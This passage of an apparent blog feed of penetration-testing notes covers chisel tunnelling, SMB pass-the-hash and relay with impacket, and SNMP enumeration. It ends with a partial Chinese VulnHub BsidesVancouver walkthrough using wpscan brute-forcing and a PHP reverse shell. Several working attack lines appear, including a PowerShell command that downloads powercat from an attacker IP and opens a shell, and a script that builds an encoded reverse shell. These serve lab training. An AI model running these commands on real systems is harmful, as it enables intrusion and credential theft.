class="code"><pre><code class="hljs bash">/tmp/chisel client 192.168.45.153:8080 R:8000:127.0.0.1:8000 <br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">.\chisel.exe client <span class="hljs-number">192.168</span>.<span class="hljs-number">45.153</span>:<span class="hljs-number">8080</span> <span class="hljs-built_in">R</span>:<span class="hljs-number">8000</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span><br></code></pre></td></tr></table></figure><p>run in background</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel client 192.168.45.153:8080 R:8000:127.0.0.1:8000 &amp;<br></code></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Start-Job</span> <span class="hljs-literal">-ScriptBlock</span> &#123; .\chisel.exe client <span class="hljs-number">192.168</span>.<span class="hljs-number">45.153</span>:<span class="hljs-number">8080</span> <span class="hljs-built_in">R</span>:<span class="hljs-number">8000</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span> &#125;<br></code></pre></td></tr></table></figure><p>more than one port</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/tmp/chisel client 192.168.45.153:51234 R:8000:127.0.0.1:8000 R:8443:127.0.01:8443<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># &quot;R&quot; <span class="hljs-keyword">is</span> shorthand <span class="hljs-keyword">for</span> &quot;127.0.0.1&quot;<br># Effectively, <span class="hljs-keyword">listen</span> <span class="hljs-keyword">on</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-keyword">on</span> attack <span class="hljs-type">box</span><br></code></pre></td></tr></table></figure><p>just add the <code>remote_socket</code></p>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>penetrate</tag>
      
      <tag>tunnel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SMB,SMTP,SNMP enum</title>
    <link href="/SMB-SMTP-SNMP-enum/"/>
    <url>/SMB-SMTP-SNMP-enum/</url>
    
    <content type="html"><![CDATA[<h1 id="SMB-attack"><a href="#SMB-attack" class="headerlink" title="SMB attack"></a>SMB attack</h1><p>tools of manage smb and enum:<br><em>enum4linux</em><br><em>CrackMapExec</em><br><em>smbclient</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -L //ip<br></code></pre></td></tr></table></figure><p>login by hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b<br><span class="hljs-built_in">dir</span><br>get secrets.txt<br></code></pre></td></tr></table></figure><ul><li><code>-U</code> set user</li><li><code>--pw-nt-hash</code> use passwd hash </li></ul><p>login by passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient  \\\\172.16.205.11\\<span class="hljs-built_in">test</span> -U joe --password=Flowers1<br></code></pre></td></tr></table></figure><p>tools of command excute:<br><em>impacket-wmiexec</em><br><em>impacket-psexec</em><br>use hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs BASH">impacket-psexec -hashes 00000000000000000000000000000000:b2c03054c306ac8fc5f9d188710b0168 administrator@192.168.214.121<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-wmiexec -hashes 00000000000000000000000000000000:2892d26cdf84d7a70e2eb3b9f05c425e Administrator@192.168.216.70<br></code></pre></td></tr></table></figure><ul><li><code>-hashs</code> use “LMHash:NTHash”,if there was no LM,use 32bit 0</li><li>second parameter: “username@ip”</li></ul><p>use passwd to get a shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-smbexec MEDTECH/joe:Flowers1@172.16.205.11<br></code></pre></td></tr></table></figure><p><em>impacket-ntlmrelayx</em><br>smb-relay passwd-hash(u cant crack)<em>no UAC</em><br>this module could relay a command to the target use the hash of passwd,if they have the same hash</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">users:<br>machine:FILE01 FILE02<br>users <span class="hljs-keyword">in</span> FILE01:<br>sam administrator file02admin<br>users <span class="hljs-keyword">in</span> FILE02:<br>dave administrator file02admin<br><br>so <span class="hljs-keyword">if</span> we have <span class="hljs-keyword">the</span> hash <span class="hljs-keyword">of</span> authencation message <span class="hljs-keyword">of</span> file02admin,we could use <span class="hljs-keyword">the</span> hash <span class="hljs-keyword">of</span> authencation <span class="hljs-built_in">to</span> pass <span class="hljs-keyword">the</span> authencation <span class="hljs-keyword">of</span> FILE02 <span class="hljs-keyword">and</span> excute <span class="hljs-keyword">the</span> <span class="hljs-keyword">command</span><br><span class="hljs-keyword">the</span> authencation about smb (Net-NTLMv2)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c <span class="hljs-string">&quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</span><br></code></pre></td></tr></table></figure><p>powershell reverse shell one-liner</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">powershell</span> IEX (New-Object System.Net.Webclient).DownloadString(<span class="hljs-string">&#x27;http://192.168.45.210/powercat.ps1&#x27;</span>);<span class="hljs-attribute">powercat</span> -c <span class="hljs-number">192.168.45.210</span> -p <span class="hljs-number">4444</span> -e cmd<br></code></pre></td></tr></table></figure><p><a href="https://www.base64encode.org/">https://www.base64encode.org/</a> encode the liner by utf-16le charset</p><p>reverse shell just powershell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> base64<br><br>payload = <span class="hljs-string">&#x27;$client = New-Object System.Net.Sockets.TCPClient(&quot;192.168.205.121&quot;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%&#123;0&#125;;while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&#x27;</span><br><br>cmd = <span class="hljs-string">&quot;powershell -nop -w hidden -e &quot;</span> + base64.b64encode(payload.encode(<span class="hljs-string">&#x27;utf16&#x27;</span>)[<span class="hljs-number">2</span>:]).decode()<br><br><span class="hljs-built_in">print</span>(cmd)<br></code></pre></td></tr></table></figure><ul><li><code>--no-http-server</code> ban http server cause we use smb relay</li><li><code>-t</code> set the target</li><li><code>-smb2support</code> add the support to smb2</li><li><code>-c</code> set the command<br>in the FILE01 machine<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">45.210</span>\test<br></code></pre></td></tr></table></figure></li></ul><p>check the dir of smb</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#powershell</span><br><span class="hljs-built_in">ls</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>\share<br>cmd<br><span class="hljs-built_in">dir</span> \\<span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>\share<br></code></pre></td></tr></table></figure><p><em>net view</em>(Windows)</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">net view \\name /all<br></code></pre></td></tr></table></figure><p><em>nbtscan</em></p><h1 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h1><p>skip!!!</p><h1 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h1><p>SNMP MIB tree</p><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1.3.6.1.2.1.25.1.6.0</td><td>System Processes</td></tr><tr><td>1.3.6.1.2.1.25.4.2.1.2</td><td>Running Programs</td></tr><tr><td>1.3.6.1.2.1.25.4.2.1.4</td><td>Processes Path</td></tr><tr><td>1.3.6.1.2.1.25.2.3.1.4</td><td>Storage Units</td></tr><tr><td>1.3.6.1.2.1.25.6.3.1.2</td><td>Software Name</td></tr><tr><td>1.3.6.1.4.1.77.1.2.25</td><td>User Accounts</td></tr><tr><td>1.3.6.1.2.1.6.13.1.3</td><td>TCP Local Ports</td></tr></tbody></table><p>public common string</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-keyword">public</span><br><span class="hljs-keyword">private</span><br>manager<br></code></pre></td></tr></table></figure><p>scan a range:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> public &gt; community<br><span class="hljs-built_in">echo</span> private &gt;&gt; community<br><span class="hljs-built_in">echo</span> manager &gt;&gt; community<br><span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 254); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> 192.168.50.<span class="hljs-variable">$ip</span>; <span class="hljs-keyword">done</span> &gt; ips<br>onesixtyone -c community -i ips<br></code></pre></td></tr></table></figure><p>tools:<br><em>snmpwalk</em>:<br>enume the hole tree</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -Oa -v1 -t 10 192.168.50.151<br></code></pre></td></tr></table></figure><ul><li><code>-c</code> set community string</li><li><code>-Oa</code> This parameter will automatically translate any hexadecimal string into ASCII that was otherwise not decoded.</li><li><code>-v1</code> specify the SNMP version number</li><li><code>-t</code> set the timeout period<br>enum the users(set OID 1.3.6.1.4.1.77.1.2.25 in the table)<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.145 1.3.6.1.4.1.77.1.2.25<br></code></pre></td></tr></table></figure>enum the process<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.145 1.3.6.1.2.1.25.4.2.1.2<br></code></pre></td></tr></table></figure>enum the software installed <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.145 1.3.6.1.2.1.25.6.3.1.2<br></code></pre></td></tr></table></figure>enum the listening tcp port<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">snmpwalk -c public -v1 192.168.240.145 1.3.6.1.2.1.6.13.1.3<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>penetrate</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp BsidesVancouver</title>
    <link href="/vulnhub-wp-BsidesVancouver/"/>
    <url>/vulnhub-wp-BsidesVancouver/</url>
    
    <content type="html"><![CDATA[<h1 id="🖳-主机发现"><a href="#🖳-主机发现" class="headerlink" title="🖳 主机发现"></a>🖳 主机发现</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo netdiscover -r 192.168.233.0/24<br><br> Currently scanning: 192.168.233.0/24   |   Screen View: Unique Hosts                              <br>                                                                                                   <br> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                   <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.233.114 08:00:27:c5:2c:52      1      60  PCS Systemtechnik GmbH                          <br> 192.168.233.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                 <br> 192.168.233.200 46:8f:d0:01:2f:b1      1      60  Unknown vendor  <br></code></pre></td></tr></table></figure><p>目标主机是：<strong>192.168.233.114</strong></p><h1 id="👁-服务扫描"><a href="#👁-服务扫描" class="headerlink" title="👁 服务扫描"></a>👁 服务扫描</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- 192.168.233.114 --min-rate 8000 -sV -sC<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/aa0549ff1aaee561ca781.png"><br>我们可以看到有一个backup_wordpress的目录，应该极大可能是一个wordpress，在浏览器访问过后也证实了这个<br>(ftp有且只有匿名登录，然后有一个用户列表文件，但是ssh爆破永远是最后一条路)<br>我们上wordpress的专业工具wpscan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan -e vp,vt,u --url http://192.168.233.114/backup_wordpress/<br></code></pre></td></tr></table></figure><ul><li><code>-e</code> 进行枚举，<code>vp</code>,漏洞插件枚举,<code>vt</code>,漏洞主题枚举,<code>u</code>，用户枚举</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(rightevil㉿kali)-[~/Desktop/besides]<br>└─$ wpscan -e vp,vt,u --url http://192.168.233.114/backup_wordpress/<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="hljs-string">&#x27;_ \</span><br><span class="hljs-string">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="hljs-string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="hljs-string"></span><br><span class="hljs-string">         WordPress Security Scanner by the WPScan Team</span><br><span class="hljs-string">                         Version 3.8.24</span><br><span class="hljs-string">       Sponsored by Automattic - https://automattic.com/</span><br><span class="hljs-string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="hljs-string">_______________________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] It seems like you have not updated the database for some time.</span><br><span class="hljs-string">[?] Do you want to update now? [Y]es [N]o, default: [N]n</span><br><span class="hljs-string">[+] URL: http://192.168.233.114/backup_wordpress/ [192.168.233.114]</span><br><span class="hljs-string">[+] Started: Fri Dec 15 22:53:17 2023</span><br><span class="hljs-string"></span><br><span class="hljs-string">Interesting Finding(s):</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Headers</span><br><span class="hljs-string"> | Interesting Entries:</span><br><span class="hljs-string"> |  - Server: Apache/2.2.22 (Ubuntu)</span><br><span class="hljs-string"> |  - X-Powered-By: PHP/5.3.10-1ubuntu3.26</span><br><span class="hljs-string"> | Found By: Headers (Passive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] XML-RPC seems to be enabled: http://192.168.233.114/backup_wordpress/xmlrpc.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="hljs-string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress readme found: http://192.168.233.114/backup_wordpress/readme.html</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Upload directory has listing enabled: http://192.168.233.114/backup_wordpress/wp-content/uploads/</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 100%</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] The external WP-Cron seems to be enabled: http://192.168.233.114/backup_wordpress/wp-cron.php</span><br><span class="hljs-string"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="hljs-string"> | Confidence: 60%</span><br><span class="hljs-string"> | References:</span><br><span class="hljs-string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 4.5 identified (Insecure, released on 2016-04-12).</span><br><span class="hljs-string"> | Found By: Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  - http://192.168.233.114/backup_wordpress/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.5&lt;/generator&gt;</span><br><span class="hljs-string"> |  - http://192.168.233.114/backup_wordpress/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.5&lt;/generator&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress theme in use: twentysixteen</span><br><span class="hljs-string"> | Location: http://192.168.233.114/backup_wordpress/wp-content/themes/twentysixteen/</span><br><span class="hljs-string"> | Last Updated: 2023-11-07T00:00:00.000Z</span><br><span class="hljs-string"> | Readme: http://192.168.233.114/backup_wordpress/wp-content/themes/twentysixteen/readme.txt</span><br><span class="hljs-string"> | [!] The version is out of date, the latest version is 3.1</span><br><span class="hljs-string"> | Style URL: http://192.168.233.114/backup_wordpress/wp-content/themes/twentysixteen/style.css?ver=4.5</span><br><span class="hljs-string"> | Style Name: Twenty Sixteen</span><br><span class="hljs-string"> | Style URI: https://wordpress.org/themes/twentysixteen/</span><br><span class="hljs-string"> | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...</span><br><span class="hljs-string"> | Author: the WordPress team</span><br><span class="hljs-string"> | Author URI: https://wordpress.org/</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="hljs-string"> |</span><br><span class="hljs-string"> | Version: 1.2 (80% confidence)</span><br><span class="hljs-string"> | Found By: Style (Passive Detection)</span><br><span class="hljs-string"> |  - http://192.168.233.114/backup_wordpress/wp-content/themes/twentysixteen/style.css?ver=4.5, Match: &#x27;</span>Version: 1.2<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No plugins Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Checking Known Locations - Time: 00:00:00 &lt;====================&gt; (630 / 630) 100.00% Time: 00:00:00</span><br><span class="hljs-string">[+] Checking Theme Versions (via Passive and Aggressive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] No themes Found.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="hljs-string"> Brute Forcing Author IDs - Time: 00:00:01 &lt;======================&gt; (10 / 10) 100.00% Time: 00:00:01</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] User(s) Identified:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] john</span><br><span class="hljs-string"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="hljs-string"> | Confirmed By:</span><br><span class="hljs-string"> |  Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> |  Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] admin</span><br><span class="hljs-string"> | Found By: Author Posts - Display Name (Passive Detection)</span><br><span class="hljs-string"> | Confirmed By:</span><br><span class="hljs-string"> |  Rss Generator (Passive Detection)</span><br><span class="hljs-string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="hljs-string"> |  Login Error Messages (Aggressive Detection)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="hljs-string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Finished: Fri Dec 15 22:53:24 2023</span><br><span class="hljs-string">[+] Requests Done: 687</span><br><span class="hljs-string">[+] Cached Requests: 9</span><br><span class="hljs-string">[+] Data Sent: 204.73 KB</span><br><span class="hljs-string">[+] Data Received: 456.144 KB</span><br><span class="hljs-string">[+] Memory used: 271.453 MB</span><br><span class="hljs-string">[+] Elapsed time: 00:00:06</span><br></code></pre></td></tr></table></figure><p>可以看到有一个john用户和admin用户，我们从ftp上下载的用户列表中也有john用户<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d01553cba4c396d0cfc08.png"></p><p>通常admin用户难以爆破，我们可以尝试以一下爆破john用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://192.168.233.114/backup_wordpress/ -U john -P /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><ul><li><code>-U</code> 指定用户或者用户列表文件</li><li><code>-P</code> 指定密码字典<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e5f045f24d945680d388f.png"></li></ul><h1 id="🚪🚶-获取权限"><a href="#🚪🚶-获取权限" class="headerlink" title="🚪🚶 获取权限"></a>🚪🚶 获取权限</h1><p>我们登录上后发现john同样是一个administrator用户，那这样我们便对一个页面进行修改，插入反弹shell语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="hljs-comment">// Copyright (C) 2007 